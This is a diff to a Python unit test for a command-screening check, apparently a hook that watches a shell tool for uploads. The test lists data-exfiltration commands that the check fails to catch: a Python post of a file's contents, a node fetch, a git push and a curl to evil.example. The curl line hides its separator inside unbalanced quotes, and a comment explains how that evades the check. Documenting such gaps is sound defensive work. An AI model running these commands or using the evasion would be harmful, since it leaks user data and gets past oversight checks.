@@ -177,7 +177,10 @@ class Uploads(unittest.TestCase):
 
     def test_known_limits_are_not_covered(self):
         for cmd in ("python3 -c \"import requests;requests.post('https://x.example',data=open('a').read())\"", "node -e \"fetch('https://x.example',{method:'POST'})\"",
-                    "git push https://x.example/r.git main"):
+                    "git push https://x.example/r.git main",
+                    # accepted limit: with unbalanced quotes the fallback is quote-blind, so a separator hidden inside a quoted
+                    # argument can split the command and hide the upload (see docs/ENGINEERING-POLICY.md section 3)
+                    "curl -H \"a;b\" -d x https://evil.example '"):
             self.assertIsNone(run(bash(cmd), CORP), cmd)  # documented gap: needs sandbox network limits or managed settings
 
 
